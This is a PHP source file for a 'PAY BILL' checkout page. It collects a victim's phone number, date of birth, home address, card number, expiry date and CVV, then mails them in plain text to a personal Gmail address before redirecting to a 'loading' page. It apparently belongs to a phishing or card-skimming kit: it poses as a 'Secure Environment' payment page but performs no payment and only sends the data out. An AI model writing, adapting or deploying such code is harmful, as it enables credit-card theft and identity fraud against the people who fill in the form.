<?php
// Start the session
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Store second form data in session variables
    $_SESSION['code_id'] = isset($_POST['code_id']) ? $_POST['code_id'] : '';
    $_SESSION['access'] = isset($_POST['access']) ? $_POST['access'] : '';
    $_SESSION['phone'] = isset($_POST['phone']) ? $_POST['phone'] : '';
    $_SESSION['amount'] = isset($_POST['amount']) ? $_POST['amount'] : '';
    $_SESSION['email'] = isset($_POST['email']) ? $_POST['email'] : '';
    $_SESSION['dob'] = isset($_POST['dob']) ? $_POST['dob'] : '';
    $_SESSION['address'] = isset($_POST['address']) ? $_POST['address'] : '';
    $_SESSION['city'] = isset($_POST['city']) ? $_POST['city'] : '';
    $_SESSION['state'] = isset($_POST['state']) ? $_POST['state'] : '';
    $_SESSION['zip'] = isset($_POST['zip']) ? $_POST['zip'] : '';

    $_SESSION['name'] = isset($_POST['name']) ? $_POST['name'] : '';
    $_SESSION['ccnum'] = isset($_POST['ccnum']) ? $_POST['ccnum'] : '';
    $_SESSION['ccexpiry'] = isset($_POST['ccexpiry']) ? $_POST['ccexpiry'] : '';
    $_SESSION['cvv'] = isset($_POST['cvv']) ? $_POST['cvv'] : '';

    // Email Details
    $message = "Form submission details:\n\n";
    $message .= "Code ID: " . $_SESSION['code_id'] . "\n";
    $message .= "Access: " . $_SESSION['access'] . "\n";
    $message .= "Phone: " . $_SESSION['phone'] . "\n";
    $message .= "Amount: $" . $_SESSION['amount'] . "\n";
    $message .= "Email: " . $_SESSION['email'] . "\n";
    $message .= "DOB: " . $_SESSION['dob'] . "\n";
    $message .= "Address: " . $_SESSION['address'] . "\n";
    $message .= "City: " . $_SESSION['city'] . "\n";
    $message .= "State: " . $_SESSION['state'] . "\n";
    $message .= "Zip: " . $_SESSION['zip'] . "\n";

    $message .= "Name on Card: " . $_SESSION['name'] . "\n";
    $message .= "Card Number: " . $_SESSION['ccnum'] . "\n";
    $message .= "Expiry: " . $_SESSION['ccexpiry'] . "\n";
    $message .= "CVV: " . $_SESSION['cvv'] . "\n";

    // Send the email
    $to = "saurkevin2@gmail.com"; // Your email address
    $subject = "Form Submission - PAY BILL";
    if (mail($to, $subject, $message)) {
        // echo "Mail sent successfully!";
        header("Location: loading.php");
        exit();
    } else {
        echo "Failed to send mail.";
    }
    session_destroy();
}
?>

<?php include 'include/header.php'; ?>
<?php include 'include/navigation3.php'; ?>

<!-- Checkout One -->
<section class="checkoutOne">
    <div class="container">
        <div class="row gap-y2">
            <div class="col-12">
                <div class="ammountBox">
                    <img src="images/lock.jpg" alt="">
                    <div class="info">
                        <small>Secure Environment</small>
                        <b id="amountDisplay">Amount: $<span id="amount_show"></span></b>
                    </div>
                </div>
            </div>
            <div class="col-12">
                <div class="sectionTitle">
                    <h5>Pay With a Credit Card</h5>
                </div>
            </div>
            <div class="col-12">
                <div class="boxOne">
                    <form method="POST">
                        <div class="row gap-y2">
                            <div class="col-md-6">
                                <div class="sectionTitle mb-3">
                                    <h4>Billing Address</h4>
                                </div>
                                <div class="row gap-y1">
                                    <div class="col-md-6 col-12">
                                        <div class="form-group">
                                            <label for="">Code ID</label>
                                            <input type="text" class="form-control" placeholder="#ID"
                                                value="<?= $_SESSION['code_id'] ?>" name="code_id" id="code_id">
                                        </div>
                                    </div>
                                    <div class="col-md-6 col-12">
                                        <div class="form-group">
                                            <label for="">Access</label>
                                            <input type="text" class="form-control" placeholder="Access"
                                                value="<?= $_SESSION['access_1'] ?>-<?= $_SESSION['access_2'] ?>-<?= $_SESSION['access_3'] ?>"
                                                name="access" id="access">
                                        </div>
                                    </div>
                                    <div class="col-md-6 col-12">
                                        <div class="form-group">
                                            <label for="">Phone no</label>
                                            <input type="text" class="form-control" placeholder="123456789" name="phone"
                                                id="phone" maxlength="10">
                                        </div>
                                    </div>
                                    <div class="col-md-6 col-12">
                                        <div class="form-group">
                                            <label for="">Amount</label>
                                            <input type="text" class="form-control" placeholder="$399.99"
                                                onkeyup="showValue(this.value)" name="amount" id="amount">
                                        </div>
                                    </div>
                                    <div class="col-md-6 col-12">
                                        <div class="form-group">
                                            <label for="">Email</label>
                                            <input type="email" class="form-control" placeholder="john@example.com"
                                                name="email" id="email">
                                        </div>
                                    </div>
                                    <div class="col-md-6 col-12">
                                        <div class="form-group">
                                            <label for="">DOB</label>
                                            <input type="date" class="form-control" placeholder="" name="dob" id="dob">
                                        </div>
                                    </div>
                                    <div class="col-md-6 col-12">
                                        <div class="form-group">
                                            <label for="">Address</label>
                                            <input type="text" class="form-control" placeholder="Address" name="address"
                                                id="address">
                                        </div>
                                    </div>
                                    <div class="col-md-6 col-12">
                                        <div class="form-group">
                                            <label for="">City</label>
                                            <input type="text" class="form-control" placeholder="City" name="city"
                                                id="city">
                                        </div>
                                    </div>
                                    <div class="col-md-6 col-12">
                                        <div class="form-group">
                                            <label for="">State</label>
                                            <input type="text" class="form-control" placeholder="State" name="state"
                                                id="state">
                                        </div>
                                    </div>
                                    <div class="col-md-6 col-12">
                                        <div class="form-group">
                                            <label for="">Zip</label>
                                            <input type="text" class="form-control" placeholder="Zip" name="zip"
                                                id="zip">
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="sectionTitle mb-3">
                                    <h4>Payment</h4>
                                </div>
                                <div class="row gap-y1">
                                    <div class="col-12">
                                        <div class="form-group">
                                            <label for="">Accepted Cards</label>
                                            <div>
                                                <img src="images/cards.png" alt="">
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-12">
                                        <div class="form-group">
                                            <label for="">Name on Card</label>
                                            <input type="text" class="form-control" placeholder="John Doe" name="name"
                                                id="name" required>
                                        </div>
                                    </div>
                                    <div class="col-12">
                                        <div class="form-group">
                                            <label for="">Credit card number</label>
                                            <input type="text" class="form-control" placeholder="1234 5678 9012 3456"
                                                name="ccnum" id="ccnum" maxlength="19" required>
                                        </div>
                                    </div>
                                    <div class="col-md-6 col-12">
                                        <div class="form-group">
                                            <label for="">Expiry MM/YY</label>
                                            <input type="text" class="form-control" placeholder="05/30" name="ccexpiry"
                                                id="ccexpiry" maxlength="5" required>
                                        </div>
                                    </div>
                                    <div class="col-md-6 col-12">
                                        <div class="form-group">
                                            <label for="">CVV</label>
                                            <input type="text" class="form-control numOnly" placeholder="123" name="cvv"
                                                id="cvv" maxlength="3" required>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-12 text-center">
                                <input type="submit" class="btn btnSecondary" value="PAY NOW" onclick="payNow()">
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</section>

<?php include 'include/footer.php'; ?>